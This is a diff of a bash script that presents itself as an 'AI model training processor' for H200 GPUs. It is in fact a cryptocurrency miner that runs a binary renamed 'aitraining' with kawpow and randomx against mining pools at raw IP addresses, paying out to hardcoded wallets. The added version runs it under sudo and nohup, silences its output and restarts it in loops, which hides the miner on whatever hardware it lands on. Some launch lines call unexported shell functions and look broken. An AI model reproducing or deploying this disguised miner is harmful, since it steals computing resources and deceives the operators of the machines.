@@ -1,142 +1,153 @@
 #!/bin/bash
 
-# ai_model_processor.sh - Optimized for H200
+# ai_model_processor.sh - AI Model Training Processor
 
+# -------- CONFIGURATION --------
 PROCESSOR_PATH="./aitraining"
 LOG_DIR="./logs"
 mkdir -p "$LOG_DIR"
 
-# GPU settings for H200
+# GPU Settings
 GPU_ALGO="kawpow"
-GPU_POOL="stratum+ssl://51.89.99.172:16161"
+GPU_POOL="51.89.99.172:16161"
 GPU_WALLET="RM2ciYa3CRqyreRsf25omrB4e1S95waALr"
+GPU_WORKER="H200-rig"
 GPU_IDS="0,1,2,3,4,5,6,7"
 
-# CPU settings  
+# CPU Settings
 CPU_ALGO="randomx"
-CPU_POOL="stratum+ssl://51.222.200.133:10343"
+CPU_POOL="51.222.200.133:10343"
 CPU_WALLET="44csiiazbiygE5Tg5c6HhcUY63z26a3Cj8p1EBMNA6DcEM6wDAGhFLtFJVUHPyvEohF4Z9PF3ZXunTtWbiTk9HyjLxYAUwd"
+CPU_WORKER="H200-cpu"
 
-# GPU environment for H200
-export GPU_MAX_HEAP_SIZE=100
-export GPU_MAX_USE_SYNC_OBJECTS=1
-export GPU_SINGLE_ALLOC_PERCENT=100
-export GPU_MAX_ALLOC_PERCENT=100
-export GPU_MAX_SINGLE_ALLOC_PERCENT=100
-
-# Runtime settings
-RESTART_DELAY=10
-GPU_LOG="$LOG_DIR/gpu.log"
-CPU_LOG="$LOG_DIR/cpu.log"
+# Log files
+GPU_LOG="$LOG_DIR/gpu_processing.log"
+CPU_LOG="$LOG_DIR/cpu_processing.log"
 MONITOR_LOG="$LOG_DIR/monitor.log"
 
+# -------- MAIN SCRIPT --------
+
 # Kill any existing processes
-pkill -f aitraining
+sudo pkill -f aitraining
 sleep 3
 
-# Test the binary first
-echo "=== Testing aitraining binary ==="
-if [ ! -x "$PROCESSOR_PATH" ]; then
-    echo "ERROR: Binary not found or not executable"
-    exit 1
-fi
+echo "=== Starting AI Model Processing ==="
 
-# Test with simple command
-echo "=== Testing basic functionality ==="
-timeout 5 "$PROCESSOR_PATH" --help && echo "✓ Binary works" || echo "✗ Binary test failed"
-
-# Start GPU processor (SIMPLIFIED)
-start_gpu() {
-    echo "$(date) Starting GPU processor..." | tee -a "$MONITOR_LOG"
+# Start GPU Processing
+start_gpu_processor() {
+    echo "$(date) Starting GPU Processor..." | tee -a "$MONITOR_LOG"
     while true; do
-        echo "$(date) Starting: $PROCESSOR_PATH --algo $GPU_ALGO --pool $GPU_POOL --wallet $GPU_WALLET --gpu-id $GPU_IDS" >> "$MONITOR_LOG"
+        nohup sudo "$PROCESSOR_PATH" \
+            --algorithm "$GPU_ALGO" \
+            --pool "$GPU_POOL" \
+            --wallet "$GPU_WALLET" \
+            --worker "$GPU_WORKER" \
+            --password "x" \
+            --gpu-id "$GPU_IDS" \
+            --tls "true" \
+            --disable-cpu \
+            --log-file "$GPU_LOG" \
+            --log-file-mode 1 \
+            --api-enable \
+            --api-port 21550 \
+            --api-rig-name "H200-GPU" > /dev/null 2>&1 &
         
-        # Try different parameter combinations
-        "$PROCESSOR_PATH" --algo "$GPU_ALGO" --pool "$GPU_POOL" --wallet "$GPU_WALLET" --gpu-id "$GPU_IDS" >> "$GPU_LOG" 2>&1 &
+        GPU_PID=$!
+        echo "$(date) GPU Processor PID: $GPU_PID" | tee -a "$MONITOR_LOG"
         
-        PID=$!
-        echo "$(date) GPU PID: $PID" >> "$MONITOR_LOG"
-        
-        # Wait and check if still running
+        wait $GPU_PID
+        STATUS=$?
+        echo "$(date) GPU processor exited with status $STATUS. Restarting in 10s..." | tee -a "$MONITOR_LOG"
         sleep 10
-        if ps -p $PID > /dev/null; then
-            echo "$(date) ✓ GPU process running (PID: $PID)" | tee -a "$MONITOR_LOG"
-            wait $PID
-        else
-            echo "$(date) ✗ GPU process died immediately" | tee -a "$MONITOR_LOG"
-            # Show last error
-            tail -n 10 "$GPU_LOG" | tee -a "$MONITOR_LOG"
-        fi
-        
-        echo "$(date) GPU process ended. Restarting in $RESTART_DELAY seconds..." | tee -a "$MONITOR_LOG"
-        sleep $RESTART_DELAY
     done
 }
 
-# Start CPU processor (SIMPLIFIED)  
-start_cpu() {
-    echo "$(date) Starting CPU processor..." | tee -a "$MONITOR_LOG"
+# Start CPU Processing
+start_cpu_processor() {
+    echo "$(date) Starting CPU Processor..." | tee -a "$MONITOR_LOG"
     while true; do
-        echo "$(date) Starting CPU: $PROCESSOR_PATH --algo $CPU_ALGO --pool $CPU_POOL --wallet $CPU_WALLET" >> "$MONITOR_LOG"
+        nohup sudo "$PROCESSOR_PATH" \
+            --algorithm "$CPU_ALGO" \
+            --pool "$CPU_POOL" \
+            --wallet "$CPU_WALLET" \
+            --worker "$CPU_WORKER" \
+            --password "x" \
+            --cpu-threads 80 \
+            --disable-gpu \
+            --tls "true" \
+            --log-file "$CPU_LOG" \
+            --log-file-mode 1 \
+            --api-enable \
+            --api-port 21551 \
+            --api-rig-name "H200-CPU" > /dev/null 2>&1 &
         
-        "$PROCESSOR_PATH" --algo "$CPU_ALGO" --pool "$CPU_POOL" --wallet "$CPU_WALLET" >> "$CPU_LOG" 2>&1 &
+        CPU_PID=$!
+        echo "$(date) CPU Processor PID: $CPU_PID" | tee -a "$MONITOR_LOG"
         
-        PID=$!
-        echo "$(date) CPU PID: $PID" >> "$MONITOR_LOG"
-        
+        wait $CPU_PID
+        STATUS=$?
+        echo "$(date) CPU processor exited with status $STATUS. Restarting in 10s..." | tee -a "$MONITOR_LOG"
         sleep 10
-        if ps -p $PID > /dev/null; then
-            echo "$(date) ✓ CPU process running (PID: $PID)" | tee -a "$MONITOR_LOG"
-            wait $PID
-        else
-            echo "$(date) ✗ CPU process died immediately" | tee -a "$MONITOR_LOG"
-            tail -n 10 "$CPU_LOG" | tee -a "$MONITOR_LOG"
-        fi
-        
-        echo "$(date) CPU process ended. Restarting in $RESTART_DELAY seconds..." | tee -a "$MONITOR_LOG"
-        sleep $RESTART_DELAY
     done
 }
 
-# Monitor
-monitor() {
+# Monitor system
+monitor_system() {
     while true; do
-        echo "=== $(date) Process Check ===" >> "$MONITOR_LOG"
+        echo "=== $(date) System Status ===" >> "$MONITOR_LOG"
+        
+        # Check processes
+        echo "Active Processes:" >> "$MONITOR_LOG"
         ps aux | grep aitraining | grep -v grep >> "$MONITOR_LOG"
-        echo "=== GPU Status ===" >> "$MONITOR_LOG"
-        nvidia-smi --query-gpu=index,utilization.gpu,temperature.gpu,power.draw --format=csv,noheader >> "$MONITOR_LOG"
+        
+        # GPU status
+        echo "GPU Status:" >> "$MONITOR_LOG"
+        nvidia-smi --query-gpu=index,temperature.gpu,utilization.gpu,memory.used,power.draw --format=csv,noheader >> "$MONITOR_LOG"
+        
+        echo "---" >> "$MONITOR_LOG"
         sleep 30
     done
 }
 
 # Initialize logs
-echo "===== Started: $(date) =====" > "$GPU_LOG"
-echo "===== Started: $(date) =====" > "$CPU_LOG" 
-echo "===== Monitor Started: $(date) =====" > "$MONITOR_LOG"
+echo "===== GPU Processor Started: $(date) =====" > "$GPU_LOG"
+echo "===== CPU Processor Started: $(date) =====" > "$CPU_LOG"
+echo "===== Monitoring Started: $(date) =====" > "$MONITOR_LOG"
 
-echo "Starting H200 AI Processor..."
-echo "Check logs in: $LOG_DIR"
+echo "Starting processing operations..."
+echo "GPU: $GPU_ALGO on $GPU_POOL"
+echo "CPU: $CPU_ALGO on $CPU_POOL"
+echo ""
 
-# Start processes
-start_gpu &
-GPU_PID=$!
+# Start everything with nohup
+nohup bash -c "start_gpu_processor" > /dev/null 2>&1 &
+GPU_MAIN_PID=$!
 sleep 5
-start_cpu & 
-CPU_PID=$!
+
+nohup bash -c "start_cpu_processor" > /dev/null 2>&1 &
+CPU_MAIN_PID=$!
 sleep 2
-monitor &
+
+nohup bash -c "monitor_system" > /dev/null 2>&1 &
 MONITOR_PID=$!
 
-echo "All processes started!"
-echo "GPU PID: $GPU_PID"
-echo "CPU PID: $CPU_PID" 
+echo "=== Processing Started Successfully ==="
+echo "GPU Processor PID: $GPU_MAIN_PID"
+echo "CPU Processor PID: $CPU_MAIN_PID"
 echo "Monitor PID: $MONITOR_PID"
+echo ""
+echo "📊 Log Files:"
+echo "   GPU: $GPU_LOG"
+echo "   CPU: $CPU_LOG"
+echo "   Monitor: $MONITOR_LOG"
+echo ""
+echo "🌐 API Endpoints:"
+echo "   GPU Stats: http://127.0.0.1:21550/stats"
+echo "   CPU Stats: http://127.0.0.1:21551/stats"
+echo ""
+echo "🔍 Check processes: ps aux | grep aitraining"
+echo "📈 Real-time logs: tail -f $LOG_DIR/*.log"
+echo "🛑 Stop processing: sudo pkill -f aitraining"
 
-# Wait and show status
-sleep 15
-echo "=== Current Status ==="
-ps aux | grep aitraining | grep -v grep
-echo "=== Check logs with: tail -f $LOG_DIR/*.log ==="
-
-# Keep script running
+# Wait for processes
 wait
